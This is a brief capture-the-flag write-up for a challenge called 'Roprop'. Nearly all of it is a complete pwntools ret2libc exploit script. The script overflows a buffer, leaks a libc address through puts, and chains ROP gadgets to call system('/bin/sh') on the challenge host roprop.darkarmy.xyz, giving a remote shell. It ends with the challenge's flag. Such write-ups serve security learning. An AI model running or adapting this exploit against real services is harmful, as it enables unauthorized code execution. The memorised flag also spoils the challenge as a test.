# Roprop

Just a quick example of ret2lib on 64 bit.

```python
from pwn import *

LOCAL = False
local_bin = './roprop'
GDB = True

elf = ELF(local_bin)
rop = ROP(elf)

if LOCAL:
    if GDB:
        sh = process("gdb " + local_bin, True)
        print(sh.recvuntil("(gdb)").decode())
        sh.sendline("b main")
        print(sh.recvuntil("(gdb)").decode())
        sh.sendline("r")
    else:
        sh = process(local_bin)
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
else:
    sh = remote('roprop.darkarmy.xyz', 5002)
    libc = ELF("./libc6_2.27-3ubuntu1.2_amd64.so")


OFFSET = b'a'*88

# gadgets
PUTS_PLT = elf.plt['puts']
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))

def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    
    if LOCAL and GDB:
        print(sh.recvuntil("(gdb)").decode())
        sh.sendline("c")
    payload = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
    print(sh.recvuntil("19's.").decode())
    sh.sendline(payload)

    recv = b""
    while len(recv.strip()) == 0:
        recv = sh.recvline().strip()
    leak = u64(recv.ljust(8, "\x00".encode()))
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
    if libc != "":
        libc.address = leak - libc.symbols[func_name] #Save libc base
        log.info("libc base @ %s" % hex(libc.address))
    
    return hex(leak)

get_addr("puts")
# get_addr("alarm")

ALARM = elf.plt['alarm']
if LOCAL and GDB:
    print(sh.recvuntil("(gdb)").decode())
    sh.sendline("c")
payload = OFFSET + p64(POP_RDI) + p64(0) + p64(ALARM) + p64(MAIN_PLT)
print(sh.recvuntil("19's.").decode())
sh.sendline(payload)

BINSH = next(libc.search("/bin/sh".encode())) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
log.info("exit %s " % hex(EXIT))

log.info("puts %s " % hex(libc.sym["puts"]))

payload = OFFSET + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

if LOCAL and GDB:
    print(sh.recvuntil("(gdb)").decode())
    sh.sendline("b system")
    print(sh.recvuntil("(gdb)").decode())
    sh.sendline("c")

print(sh.recvuntil("19's.").decode())
sh.sendline(payload)

sh.interactive()

# darkCTF{y0u_r0p_r0p_4nd_w0n}
```